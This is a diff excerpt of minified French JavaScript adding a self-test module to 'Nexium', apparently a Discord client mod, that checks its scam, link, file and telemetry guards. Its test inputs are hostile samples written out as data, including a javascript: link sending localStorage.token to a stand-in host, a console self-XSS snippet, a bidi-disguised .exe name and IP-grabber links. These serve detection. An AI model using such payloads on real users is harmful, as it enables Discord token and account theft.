+_NXPRV.notify=function(){for(var a=0;a<_NXPRV.listeners.length;a++){try{_NXPRV.listeners[a]();}catch(_){}}};
+_NXPRV.ajoute=function(g,id,t,d,fn){_NXPRV.T.push({g:g,id:id,t:t,d:d,fn:fn});};
+_NXPRV.compte=function(g){var n={agit:0,echec:0,coupe:0,na:0,total:0};
+for(var a=0;a<_NXPRV.T.length;a++){var e=_NXPRV.T[a];if(g&&e.g!==g)continue;n.total++;
+var r=_NXPRV.res[e.id];if(r&&n[r.etat]!=null)n[r.etat]++;}
+return n;};
+_NXPRV.pose=function(id,etat,det){_NXPRV.res[id]={etat:etat,det:det||"",t:Date.now()};_NXPRV.notify();};
+_NXPRV.lance=function(g,fin){try{
+if(_NXPRV.encours)return false;
+_NXPRV.encours=true;_NXPRV.fini=0;_NXPRV.debut=Date.now();_NXPRV.muet=true;_NXPRV.avertis=[];
+var L=[];
+for(var a=0;a<_NXPRV.T.length;a++){if(!g||_NXPRV.T[a].g===g)L.push(_NXPRV.T[a]);}
+for(var b=0;b<L.length;b++)delete _NXPRV.res[L[b].id];
+_NXPRV.total=L.length;_NXPRV.notify();
+var k=0;
+var suite=function(){
+if(k>=L.length){_NXPRV.encours=false;_NXPRV.muet=false;_NXPRV.duree=Date.now()-_NXPRV.debut;_NXPRV.notify();if(fin)try{fin(_NXPRV.compte(g));}catch(_){}return;}
+var e=L[k++];
+var rendu=false;
+var minuteur=setTimeout(function(){if(rendu)return;rendu=true;_NXPRV.pose(e.id,"echec","aucune reponse en 9 s");_NXPRV.fini++;suite();},9000);
+var fini=function(etat,det){if(rendu)return;rendu=true;try{clearTimeout(minuteur);}catch(_){}
+_NXPRV.pose(e.id,etat,det);_NXPRV.fini++;setTimeout(suite,60);};
+try{e.fn(fini);}catch(err){fini("echec",(err&&err.message)||"exception");}};
+suite();
+return true;}catch(_){_NXPRV.encours=false;_NXPRV.muet=false;return false;}};
+
+_NXPRV.instantane=function(){try{
+return {st:JSON.stringify(_NXPR.stats),quar:JSON.stringify(_NXPR.quar||[])};}catch(_){return null;}};
+_NXPRV.restaure=function(sn){try{
+if(!sn)return;
+_NXPR.stats=JSON.parse(sn.st);_NXPR.quar=JSON.parse(sn.quar);
+_NXPR.saveStats();_NXPR.saveQuar();_NXPR.notify();}catch(_){}};
+_NXPRV.instP=function(){try{return JSON.stringify(_NXP.stats);}catch(_){return null;}};
+_NXPRV.restP=function(sn){try{if(!sn)return;_NXP.stats=JSON.parse(sn);_NXP.saveStatsNow();_NXP.tnotify();}catch(_){}};
+_NXPRV.avertis=[];_NXPRV.muet=false;
+_NXPRV.parMessage=function(contenu,attendu,fin,pj){
+var sn=_NXPRV.instantane();
+var n0=_NXPRV.avertis.length;
+try{
+_NXPR.onMsg({message:{id:"1",channel_id:"1",content:contenu,
+author:{id:"424242424242424242",username:"preuve",bot:false},
+attachments:pj||[],embeds:[]}});
+var rec=(_NXPR.stats.recent||[]);
+var vus=[];for(var a=0;a<rec.length;a++)vus.push(rec[a].k);
+var det=rec.length?(rec[0].k+" : "+String(rec[0].d||"").slice(0,70)):"";
+var avert=_NXPRV.avertis.length>n0?_NXPRV.avertis[n0]:"";
+_NXPRV.restaure(sn);
+if(vus.indexOf(attendu)>=0)return fin("agit",det+(avert?" - averti : "+avert.slice(0,80):" - aucun avertissement affiche"));
+return fin("echec",vus.length?("detecte a la place : "+vus.join(", ")):"rien detecte");
+}catch(e){_NXPRV.restaure(sn);return fin("echec",(e&&e.message)||"exception");}};
+_NXPRV.fluxDispo=function(){try{var C=_NXcommon();
+return !!((C&&C.C&&C.C.FluxDispatcher)||(C&&C.WP&&C.WP.findByProps&&C.WP.findByProps("subscribe","dispatch","_actionHandlers")));}catch(_){return false;}};
+_NXPRV.fermeModale=function(){try{
+var m=document.getElementById("nx-blocked-modal");
+if(m&&m.parentNode){m.parentNode.removeChild(m);return true;}
+return false;}catch(_){return false;}};
+
+_NXPRV.ajoute("protect","pr_classe","Reconnaissance d un logger d IP",
+"Un vrai lien grabify est passe au classificateur.",function(fin){
+if(!_NXPR.cfg.scanLinks)return fin("coupe","l analyse des liens est eteinte dans les reglages");
+var cl=_NXPR.classify("http://grabify.link/nx-preuve-"+Date.now());
+if(cl&&cl.kind==="grabber")return fin("agit","grabify.link classe comme logger d IP");
+return fin("echec","classe comme "+((cl&&cl.kind)||"rien"));});
+
+_NXPRV.ajoute("protect","pr_base","Base de menaces chargee",
+"Le nombre d empreintes reellement en memoire, et une recherche reelle dedans.",function(fin){
+var f=_NXPR.empreintes;
+if(!f||!f.length)return fin("echec","aucune empreinte en memoire");
+var trouve=_NXPR.dansR("grabify.link");
+var det=f.length+" empreintes ("+Math.round(f.byteLength/104857.6)/10+" Mo)";
+if(_NXPR.remote&&_NXPR.remote.at)det+=", chargee il y a "+Math.max(0,Math.round((Date.now()-_NXPR.remote.at)/60000))+" min";
+return fin("agit",det+(trouve?", recherche concluante":", recherche negative sur le temoin"));});
+
+_NXPRV.ajoute("protect","pr_clic","Un clic sur un lien piege est reellement bloque",
+"Un vrai lien est cree, un vrai clic est envoye : on verifie que le navigateur ne suit pas.",function(fin){
+if(!_NXPR.cfg.scanLinks||!_NXPR.cfg.blockGrabbers)return fin("coupe","le blocage des loggers d IP est eteint");
+if(!_NXPR._dom)return fin("echec","les ecouteurs de clic ne sont pas poses");
+var sn=_NXPRV.instantane();
+var a=null;
+try{
+a=document.createElement("a");
+a.href="http://grabify.link/nx-preuve";
+a.textContent="preuve";
+a.setAttribute("aria-hidden","true");
+a.style.cssText="position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;";
+document.body.appendChild(a);
+var ev=new MouseEvent("click",{bubbles:true,cancelable:true,view:window});
+a.dispatchEvent(ev);
+var bloque=!!ev.defaultPrevented;
+var modale=!!document.getElementById("nx-blocked-modal");
+_NXPRV.fermeModale();
+try{if(a.parentNode)a.parentNode.removeChild(a);}catch(_){}
+_NXPRV.restaure(sn);
+if(bloque&&modale)return fin("agit","clic annule et fenetre d avertissement affichee");
+if(bloque)return fin("agit","clic annule, sans fenetre");
+return fin("echec","le clic n a pas ete annule");
+}catch(e){
+try{if(a&&a.parentNode)a.parentNode.removeChild(a);}catch(_){}
+_NXPRV.fermeModale();_NXPRV.restaure(sn);
+return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("protect","pr_avert","Un avertissement atteint vraiment l ecran",
+"Un vrai avertissement est affiche, mesure, puis retire.",function(fin){
+var voieD=false;
+try{var C=_NXcommon().C;voieD=!!(C&&C.Toasts&&typeof C.Toasts.show==="function");}catch(_){}
+var ok=false;
+try{ok=_NXPR.toastDom("Preuve Nexium : cet avertissement est reel.",1);}catch(_){}
+if(!ok)return fin("echec","le repli d affichage a echoue"+(voieD?", mais la voie Discord repond":""));
+setTimeout(function(){try{
+var box=document.getElementById("nx-avert");
+var el=box&&box.lastChild;
+var r=el&&el.getBoundingClientRect?el.getBoundingClientRect():null;
+var vu=!!(r&&r.width>40&&r.height>10);
+try{if(el&&el.parentNode)el.parentNode.removeChild(el);}catch(_){}
+if(!vu)return fin("echec","l avertissement a ete cree mais n occupe aucune place a l ecran");
+return fin("agit",Math.round(r.width)+"x"+Math.round(r.height)+" px"+(voieD?", voie Discord aussi disponible":", voie Discord indisponible : le repli Nexium prend le relais"));
+}catch(e){return fin("echec",(e&&e.message)||"exception");}},80);});
+
+_NXPRV.ajoute("protect","pr_fichier","Un executable deguise en image est reconnu",
+"Les octets d un vrai en-tete Windows sont passes au lecteur de signature.",function(fin){
+if(!_NXPR.cfg.scanFiles)return fin("coupe","l analyse des fichiers est eteinte");
+try{
+var b=new Uint8Array([0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00]);
+var sig=_NXPR.matchSig(b);
+if(sig&&sig.bad)return fin("agit","en-tete MZ reconnu : "+sig.t);
+if(sig)return fin("echec","reconnu comme "+sig.t+" mais non signale dangereux");
+return fin("echec","en-tete MZ non reconnu");}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("protect","pr_secret","Un jeton dans un message est repere",
+"Un faux jeton au format reel est passe au detecteur.",function(fin){
+try{
+var faux="MTIzNDU2Nzg5MDEyMzQ1Njc4."+"Gk9Vzq."+"nx_preuve_ceci_nest_pas_un_vrai_jeton_00";
+if(_NXPR.RXTOKEN&&_NXPR.RXTOKEN.test(faux)){try{_NXPR.RXTOKEN.lastIndex=0;}catch(_){}return fin("agit","format de jeton reconnu");}
+try{_NXPR.RXTOKEN.lastIndex=0;}catch(_){}
+return fin("echec","le format de jeton n est pas reconnu");}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("protect","pr_masque","Un lien trompeur est demasque",
+"Un lien qui affiche discord.com mais mene ailleurs est passe au scanner, et on verifie qu il finit au journal.",function(fin){
+if(!_NXPR.cfg.scanLinks||!_NXPR.cfg.scanMasked)return fin("coupe","le demasquage des liens est eteint");
+var sn=_NXPRV.instantane();
+var avant=((_NXPR.stats.recent||[]).length);
+try{
+_NXPR.scanMasked("[https://discord.com/nitro](http://grabify.link/nx-preuve)");
+var apres=((_NXPR.stats.recent||[]).length);
+var dernier=(_NXPR.stats.recent||[])[0];
+var det=dernier?(dernier.k+" : "+dernier.d):"";
+_NXPRV.restaure(sn);
+if(apres>avant)return fin("agit","inscrit au journal ("+det+")");
+return fin("echec","aucune trace au journal");}catch(e){_NXPRV.restaure(sn);return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("protect","pr_ecoute","Les ecouteurs sont bien poses",
+"On verifie que Nexium est reellement branche aux clics, aux collages et aux messages.",function(fin){
+var manque=[];
+if(!_NXPR._dom)manque.push("clics et collages");
+if(!_NXPR.abonne)manque.push("messages Discord");
+if(!manque.length)return fin("agit","clics, collages et messages : branches");
+if(!_NXPR.abonne&&!_NXPRV.fluxDispo())return fin("na","Discord n a pas encore ouvert son flux de messages");
+if(manque.length===2)return fin("echec","aucun branchement actif");
+return fin("echec","branchement manquant : "+manque.join(", "));});
+
+_NXPRV.ajoute("protect","pr_masquage","Un lien dangereux est reellement recouvert",
+"Un vrai lien est pose dans la page, puis on mesure ce qu il reste de lisible a l ecran.",function(fin){
+if(!_NXPR.cfg.scanLinks||!_NXPR.cfg.maskLinks)return fin("coupe","le masquage des liens est eteint");
+var a=null;
+try{
+a=document.createElement("a");
+a.href="http://grabify.link/nx-preuve-masque";
+a.textContent="clique ici pour ton nitro gratuit";
+a.style.cssText="position:fixed;left:8px;bottom:8px;z-index:1;";
+document.body.appendChild(a);
+var n=_NXPR.masqueUn(a);
+var masque=!!(a.classList&&a.classList.contains("nx-masque"));
+var etiquette=a.getAttribute("data-nx-masque")||"";
+var vu="";
+try{vu=(getComputedStyle(a,"::after").content||"").replace(/^"|"$/g,"");}catch(_){}
+var couleur="";
+try{couleur=getComputedStyle(a).color;}catch(_){}
+var invisible=(couleur.indexOf("rgba")>=0&&couleur.indexOf(", 0)")>=0)||couleur==="transparent";
+try{if(a.parentNode)a.parentNode.removeChild(a);}catch(_){}
+if(!masque)return fin("echec","le lien n a pas ete recouvert");
+if(!etiquette)return fin("echec","le lien est recouvert mais rien n explique pourquoi");
+if(!invisible)return fin("agit",etiquette+" (le texte d origine reste lisible : la feuille de style n est pas appliquee)");
+return fin("agit",etiquette+" - le texte d origine n est plus lisible"+(vu?" et l etiquette est peinte":""));
+}catch(e){try{if(a&&a.parentNode)a.parentNode.removeChild(a);}catch(_){}
+return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("protect","pr_repetition","Un meme lien n est pas ranalyse sans fin",
+"Le meme lien est soumis deux fois : on verifie qu il n est compte et annonce qu une seule fois.",function(fin){
+if(!_NXPR.cfg.scanLinks)return fin("coupe","l analyse des liens est eteinte");
+var sn=_NXPRV.instantane();
+var n0=_NXPRV.avertis.length;
+try{
+var u="http://grabify.link/nx-preuve-repetition-"+Date.now();
+_NXPR.scanUrl(u,true);
+var s1=_NXPR.stats.scanned||0,j1=(_NXPR.stats.recent||[]).length,a1=_NXPRV.avertis.length;
+_NXPR.scanUrl(u,true);
+_NXPR.scanUrl(u,true);
+var s2=_NXPR.stats.scanned||0,j2=(_NXPR.stats.recent||[]).length,a2=_NXPRV.avertis.length;
+_NXPRV.restaure(sn);
+if(s2!==s1)return fin("echec","le compteur monte encore : "+s1+" puis "+s2);
+if(j2!==j1)return fin("echec","le journal se remplit encore : "+j1+" puis "+j2);
+if(a2!==a1)return fin("echec","l avertissement se repete");
+return fin("agit","3 passages, 1 seul comptage, 1 seul avertissement (le blocage, lui, reste actif a chaque clic)");
+}catch(e){_NXPRV.restaure(sn);return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("protect","pr_sortie","Les gardes de sortie sont en place",
+"On relit l etat reel des controles qui empechent tes donnees de sortir.",function(fin){
+try{
+if(!window._NXGD||typeof _NXGD.status!=="function")return fin("echec","le module de gardes est absent");
+var s=_NXGD.status();
+if(!s.reseau)return fin("echec","les gardes ne sont pas branchees au reseau");
+var on=[];
+if(s.webhook)on.push("webhooks");
+if(s.egress)on.push("sorties");
+if(s.balise)on.push("balises");
+if(s.dom)on.push("injections");
+if(s.charge)on.push("charges utiles");
+if(!on.length)return fin("coupe","toutes les gardes de sortie sont eteintes");
+return fin("agit",on.join(", ")+" - "+s.total+" adresse(s) surveillee(s)");}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_fetch","Une requete de telemetrie est arretee",
+"Une vraie requete vers le point de collecte de Discord est emise et suivie.",function(fin){
+if(!_NXP.cfg.blockTel)return fin("coupe","le blocage de la telemetrie est eteint");
+if(!window.fetch||!window.fetch.__nx)return fin("echec","la garde sur fetch n est pas en place");
+var sn=_NXPRV.instP();
+var avant=_NXP.stats.blocked||0;
+try{
+fetch("https://discord.com/api/v9/science?nx=preuve",{method:"POST",body:"{}"}).then(function(r){
+var apres=_NXP.stats.blocked||0;
+var monte=apres>avant;
+_NXPRV.restP(sn);
+if(r&&r.status===204&&monte)return fin("agit","requete interceptee, reponse vide rendue sans sortir de la machine");
+if(r&&r.status===204)return fin("agit","requete interceptee (compteur inchange)");
+return fin("echec","la requete est partie, statut "+((r&&r.status)||"?"));
+}).catch(function(e){_NXPRV.restP(sn);return fin("echec","erreur : "+((e&&e.message)||"inconnue"));});
+}catch(e){_NXPRV.restP(sn);return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_xhr","Un envoi XHR de telemetrie est arrete",
+"Un vrai XMLHttpRequest est ouvert et envoye vers le point de collecte.",function(fin){
+if(!_NXP.cfg.blockTel)return fin("coupe","le blocage de la telemetrie est eteint");
+if(!window.XMLHttpRequest||!window.XMLHttpRequest.prototype.__nx)return fin("echec","la garde sur XHR n est pas en place");
+var sn=_NXPRV.instP();
+try{
+var x=new XMLHttpRequest();
+x.open("POST","https://discord.com/api/v9/science?nx=preuve-xhr");
+var parti=false;
+x.onloadend=function(){parti=true;};
+x.send("{}");
+setTimeout(function(){
+try{x.abort();}catch(_){}
+_NXPRV.restP(sn);
+if(parti)return fin("echec","la requete est partie");
+if(x.readyState===1)return fin("agit","envoi neutralise, la requete n a jamais quitte la machine");
+return fin("agit","envoi neutralise (etat "+x.readyState+")");},700);
+}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_balise","Les balises de fond sont arretees",
+"On verifie que sendBeacon passe par Nexium et que le point de collecte est bien reconnu.",function(fin){
+if(!navigator.sendBeacon)return fin("na","ce navigateur n a pas sendBeacon");
+if(!navigator.sendBeacon.__nx)return fin("echec","la garde sur sendBeacon n est pas en place");
+if(!_NXP.cfg.blockTel)return fin("coupe","le blocage de la telemetrie est eteint");
+var k=_NXP.classify("https://discord.com/api/v9/metrics");
+if(!k)return fin("echec","le point de collecte n est pas reconnu");
+return fin("agit","garde posee, /metrics reconnu comme "+k);});
+
+_NXPRV.ajoute("privacy","pv_ws","Une connexion permanente de collecte est refusee",
+"Une vraie tentative d ouverture de WebSocket vers une adresse de collecte est faite.",function(fin){
+if(!window.WebSocket||!window.WebSocket.__nx)return fin("echec","la garde sur WebSocket n est pas en place");
+if(!_NXP.cfg.blockAnalytics)return fin("coupe","le blocage des mesures d audience est eteint");
+var ws=null;
+try{
+ws=new WebSocket("wss://nx-preuve.invalid/analytics");
+try{ws.close();}catch(_){}
+return fin("echec","la connexion a ete acceptee");
+}catch(e){
+if(e&&e.message==="Blocked by Nexium")return fin("agit","ouverture refusee avant tout echange");
+return fin("agit","ouverture refusee ("+((e&&e.message)||"erreur")+")");}});
+
+_NXPRV.ajoute("privacy","pv_utm","Les marqueurs de suivi sont retires des liens",
+"Un vrai lien marque est passe au nettoyeur.",function(fin){
+if(!_NXP.cfg.stripTracking)return fin("coupe","le nettoyage des liens est eteint");
+try{
+var u="https://exemple.test/page?a=1&utm_source=discord&fbclid=xyz&gclid=abc";
+var c=_NXP.cleanUrl(u);
+var reste=[];
+if(c.indexOf("utm_source")>=0)reste.push("utm_source");
+if(c.indexOf("fbclid")>=0)reste.push("fbclid");
+if(c.indexOf("gclid")>=0)reste.push("gclid");
+if(reste.length)return fin("echec","marqueurs restants : "+reste.join(", "));
+if(c.indexOf("a=1")<0)return fin("echec","le nettoyage a supprime un parametre legitime");
+return fin("agit","3 marqueurs retires, le reste du lien intact");}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_entetes","Les en-tetes de suivi sont retires",
+"De vrais en-tetes de suivi sont soumis au filtre de sortie.",function(fin){
+if(!_NXP.cfg.stripHeaders)return fin("coupe","le retrait des en-tetes est eteint");
+try{
+var o=_NXP.stripOut({headers:{"x-track":"1","x-discord-timezone":"Europe/Paris","content-type":"application/json"}});
+var h=(o&&o.headers)||{};
+var reste=[];
+for(var k in h){if(String(k).toLowerCase()==="x-track"||String(k).toLowerCase()==="x-discord-timezone")reste.push(k);}
+if(reste.length)return fin("echec","en-tetes restants : "+reste.join(", "));
+if(!h["content-type"])return fin("echec","un en-tete legitime a ete supprime");
+return fin("agit","x-track et x-discord-timezone retires, content-type conserve");}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_noms","Les noms de fichiers envoyes sont anonymises",
+"Un vrai corps d envoi de piece jointe est passe au masque.",function(fin){
+if(!_NXP.cfg.stripFilenames)return fin("coupe","l anonymisation des noms est eteinte");
+try{
+var body=JSON.stringify({files:[{filename:"photo_maison_2019.png",id:0}]});
+var o=_NXP.maskNames("https://discord.com/api/v9/channels/1/attachments",{body:body});
+var j=JSON.parse(o.body);
+var n=j.files[0].filename;
+if(n==="photo_maison_2019.png")return fin("echec","le nom n a pas ete change");
+if(n.indexOf(".png")<0)return fin("echec","l extension a ete perdue : "+n);
+return fin("agit","photo_maison_2019.png devient "+n);}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_stun","Les serveurs STUN etrangers sont ecartes",
+"Une vraie connexion pair-a-pair est ouverte avec un serveur de Google, puis inspectee.",function(fin){
+if(!_NXP.cfg.blockStun)return fin("coupe","le filtrage des serveurs STUN est eteint");
+if(!window.RTCPeerConnection)return fin("na","ce navigateur n a pas RTCPeerConnection");
+if(!window.RTCPeerConnection.__nxp)return fin("echec","la garde sur RTCPeerConnection n est pas en place");
+var pc=null;
+try{
+pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"},{urls:"stun:stun.discord.media:3478"}]});
+var c=(pc.getConfiguration&&pc.getConfiguration())||{};
+var L=c.iceServers||[];
+var reste=[];
+for(var a=0;a<L.length;a++){var u=L[a]&&L[a].urls;var t=(typeof u==="string")?[u]:(u||[]);
+for(var b=0;b<t.length;b++)reste.push(String(t[b]));}
+try{pc.close();}catch(_){}
+var google=false;for(var d=0;d<reste.length;d++)if(reste[d].indexOf("google")>=0)google=true;
+if(google)return fin("echec","le serveur de Google est toujours dans la liste");
+return fin("agit","serveur de Google ecarte, "+reste.length+" serveur(s) Discord conserve(s)");
+}catch(e){try{if(pc)pc.close();}catch(_){}return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_materiel","Les caracteristiques de la machine sont normalisees",
+"On lit ce que le site verrait reellement.",function(fin){
+if(!_NXP.cfg.spoofHardware)return fin("coupe","la normalisation du materiel est eteinte");
+try{
+var c=navigator.hardwareConcurrency,m=navigator.deviceMemory;
+if(c===8&&(m===8||m===undefined))return fin("agit","un site lit 8 coeurs et 8 Go, quelle que soit ta machine");
+return fin("echec","un site lit encore "+c+" coeurs et "+m+" Go");}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_presse","Les liens copies sont nettoyes",
+"On verifie que la copie passe par Nexium, puis on nettoie un lien reel.",function(fin){
+if(!_NXP.cfg.cleanClipboard)return fin("coupe","le nettoyage du presse-papiers est eteint");
+if(!navigator.clipboard||!navigator.clipboard.writeText)return fin("na","ce navigateur ne donne pas acces au presse-papiers");
+if(!navigator.clipboard.writeText.__nx)return fin("echec","la garde sur le presse-papiers n est pas en place");
+try{
+var c=_NXP.cleanUrl("https://exemple.test/x?utm_campaign=nx");
+if(c.indexOf("utm_campaign")>=0)return fin("echec","le nettoyeur ne retire pas le marqueur");
+return fin("agit","garde posee, un lien copie est nettoye avant d atteindre le presse-papiers");}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_flux","Les evenements internes sont filtres",
+"On verifie que Nexium est bien insere dans le flux d evenements de Discord.",function(fin){
+if(!_NXP.fxi&&!_NXPRV.fluxDispo())return fin("na","Discord n a pas encore ouvert son flux d evenements");
+if(!_NXP.fxi)return fin("echec","l intercepteur d evenements n est pas pose");
+var sn=_NXPRV.instP();
+try{
+var r=_NXP.onFlux({type:"TRACK",event:"nx_preuve"});
+_NXPRV.restP(sn);
+return fin("agit","intercepteur pose, un evenement de suivi est "+(r?"arrete":"laisse passer, la telemetrie est eteinte dans les reglages"));}catch(e){_NXPRV.restP(sn);return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("protect","pr_arnaque","Un message d arnaque est reconnu",
+"Un vrai message de type nitro gratuit traverse toute la chaine de lecture.",function(fin){
+if(!_NXPR.cfg.scamAlerts)return fin("coupe","les alertes d arnaque sont eteintes");
+_NXPRV.parMessage("Free nitro pour tout le monde, claim your free gift ici : https://discord-nitro-free.example/claim","scam",fin);});
+
+_NXPRV.ajoute("protect","pr_ip","Un lien vers une adresse IP brute est signale",
+"Un vrai message contenant une adresse IB brute traverse la chaine de lecture.",function(fin){
+if(!_NXPR.cfg.ipGuard)return fin("coupe","la garde sur les adresses IP est eteinte");
+_NXPRV.parMessage("regarde ca http://185.234.12.9/setup et dis moi","rawip",fin);});
+
+_NXPRV.ajoute("protect","pr_oauth","Une autorisation d application dangereuse est signalee",
+"Un vrai lien d autorisation avec des droits sensibles traverse la chaine de lecture.",function(fin){
+if(!_NXPR.cfg.oauthGuard)return fin("coupe","la garde sur les autorisations est eteinte");
+_NXPRV.parMessage("rejoins mon serveur https://discord.com/oauth2/authorize?client_id=1&scope=bot%20webhook.incoming&permissions=8","oauth",fin);});
+
+_NXPRV.ajoute("protect","pr_scheme","Un lien qui execute du code est signale",
+"Un vrai schema executable traverse la chaine de lecture.",function(fin){
+if(!_NXPR.cfg.schemeGuard)return fin("coupe","la garde sur les schemas est eteinte");
+_NXPRV.parMessage("colle ca dans la barre : javascript:fetch('https://vol.example/'+localStorage.token)","scheme",fin);});
+
+_NXPRV.ajoute("protect","pr_invisible","Un texte trompeur est signale",
+"Un vrai message contenant une inversion du sens de lecture traverse la chaine.",function(fin){
+if(!_NXPR.cfg.bidiGuard)return fin("coupe","la garde sur les caracteres trompeurs est eteinte");
+_NXPRV.parMessage("telecharge ce fichier photo\u202Egnp.exe et ouvre le","bidi",fin);});
+
+_NXPRV.ajoute("protect","pr_webhook","Un webhook publie dans un message est signale",
+"Une vraie adresse de webhook traverse la chaine de lecture.",function(fin){
+if(!_NXPR.cfg.scamAlerts)return fin("coupe","les alertes d arnaque sont eteintes");
+_NXPRV.parMessage("voila mon hook https://discord.com/api/webhooks/123456789012345678/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","secret",fin);});
+
+_NXPRV.ajoute("protect","pr_console","Le code a coller dans la console est signale",
+"Un vrai bout de code de vol de jeton traverse la chaine de lecture.",function(fin){
+if(!_NXPR.cfg.consoleGuard)return fin("coupe","la garde sur la console est eteinte");
+_NXPRV.parMessage("fais F12 puis colle : webpackChunkdiscord_app.push([[Math.random()],{},function(r){}])","selfxss",fin);});
+
+_NXPRV.ajoute("protect","pr_piece","Une piece jointe executable est signalee",
+"Une vraie piece jointe au nom piege traverse la chaine de lecture.",function(fin){
+if(!_NXPR.cfg.scanFiles)return fin("coupe","l analyse des fichiers est eteinte");
+_NXPRV.parMessage("tiens le crack","file",fin,[{filename:"photo_vacances.scr",url:"https://cdn.discordapp.com/nx-preuve",size:1024}]);});
+
+_NXPRV.ajoute("protect","pr_veille","La console porte l avertissement anti-arnaque",
+"On verifie que le message qui protege du vol par la console a bien ete pose.",function(fin){
+if(!_NXPR.cfg.consoleGuard)return fin("coupe","la garde sur la console est eteinte");
+if(_NXPR._cw)return fin("agit","message pose dans la console au demarrage");
+try{_NXPR.consoleWarn();}catch(_){}
+if(_NXPR._cw)return fin("agit","message pose a la demande");
+return fin("echec","le message n a pas pu etre pose");});
+
+_NXPRV.ajoute("privacy","pv_frappe","L indicateur de frappe est retenu",
+"Le vrai chemin qui previent tes contacts que tu ecris est soumis au filtre.",function(fin){
+if(!_NXP.cfg.silentTyping)return fin("coupe","l indicateur de frappe est laisse actif");
+var sn=_NXPRV.instP();
+try{var r=_NXP.shouldBlock("https://discord.com/api/v9/channels/424242/typing");
+_NXPRV.restP(sn);
+if(r)return fin("agit","le signal je suis en train d ecrire ne part plus");
+return fin("echec","le signal part encore");}catch(e){_NXPRV.restP(sn);return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_lu","L accuse de lecture est retenu",
+"Le vrai chemin qui signale que tu as lu un message est soumis au filtre.",function(fin){
+if(!_NXP.cfg.noAck)return fin("coupe","l accuse de lecture est laisse actif");
+var sn=_NXPRV.instP();
+try{var r=_NXP.shouldBlock("https://discord.com/api/v9/channels/424242/messages/1/ack");
+_NXPRV.restP(sn);
+if(r)return fin("agit","le signal j ai lu ne part plus");
+return fin("echec","le signal part encore");}catch(e){_NXPRV.restP(sn);return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_purge","L effacement a la fermeture sait quoi effacer",
+"On liste, sans rien effacer, ce qui disparaitra a la fermeture.",function(fin){
+if(!_NXP.cfg.purgeOnQuit)return fin("coupe","l effacement a la fermeture est eteint");
+try{var a=_NXP.purgeApercu();
+if(!a.total)return fin("echec","aucune trace n est declaree");
+return fin("agit",a.n+" trace(s) sur "+a.total+" presentes, "+Math.round(a.octets/1024)+" Ko, effacees a la fermeture");}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+_NXPRV.ajoute("privacy","pv_gardes","Aucune garde n a ete ecrasee",
+"On relit l etat reel des six points d interception.",function(fin){
+try{
+var t=_NXP.gardesTombees();
+if(!t.length)return fin("agit","fetch, XHR, balises, WebSocket et pair-a-pair : tous tenus"+(_NXP.repose?" ("+_NXP.repose+" remise(s) en place depuis le demarrage)":""));
+return fin("echec","garde(s) tombee(s) : "+t.join(", "));}catch(e){return fin("echec",(e&&e.message)||"exception");}});
+
+}catch(_nxE){try{window._NXFAIL=window._NXFAIL||[];_NXFAIL.push("_NXPRV");if(window._NXERR)_NXERR.push("module _NXPRV :: "+((_nxE&&_nxE.message)||"erreur"));}catch(_){}}
+}
 var _NXBADGE=window._NXBADGE||(window._NXBADGE={});
 if(!_NXBADGE.boot){try{_NXBADGE.boot=true;
 _NXBADGE.API="https://emcoqnvxriyrchmfpunq.supabase.co/functions/v1/users";
@@ -10919,6 +11653,7 @@ paddingTop:"14px",borderTop:"1px solid "+P.line}},
 _NXbtn(_T("Tout couper"),function(){L.tout(false);force();},n?"danger":null),
 _NXbtn(_T("Tout activer"),function(){L.tout(true);force();}))),{mb:12}),
 capot(),
+window._NXPRV?i(NexiumPreuveComp,{g:null,key:"preuve"}):null,
 _NXcard(i("div",{style:{fontSize:"11.5px",color:P.dim,lineHeight:1.65}},
 _T("Une fonction quitte le labo quand elle a tenu assez longtemps sans casser : elle rejoint alors le client pour tout le monde, et disparait de cette page. Si une fonction d essai pose probleme, coupe-la ici et signale-le : c est exactement a ca que sert cette page.")),{mb:0}),
 _NXfoot("Nexium Labo \u00b7 rien n est actif par defaut")));
